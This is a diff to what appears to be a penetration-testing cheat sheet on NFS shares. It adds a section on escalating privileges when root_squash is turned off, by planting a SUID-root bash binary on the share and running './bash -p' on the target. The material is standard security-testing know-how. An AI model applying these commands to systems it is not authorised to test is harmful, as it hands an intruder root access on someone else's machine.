@@ -17,6 +17,25 @@ sudo mkdir /mnt/<share>
 sudo mount <ip>:/<share> /mnt/<share>
 ```
 
+## Privilege escalation via root_squash
+
+When enabled (default), connected users are assigned "nfsnobody" (least local privileges). 
+However, when turned off, one can upload a SUID binary and execute it.
+
+e.g. using bash
+
+```bash
+# get a compatible bash binary for the target system
+sudo chown root bash
+sudo chmod +sx bash
+```
+
+On target
+```bash
+./bash -p
+```
+
+
 ## Exploitation
 
 If permissions are "65534 / nobody", "4294967294 / UNKNOWN"
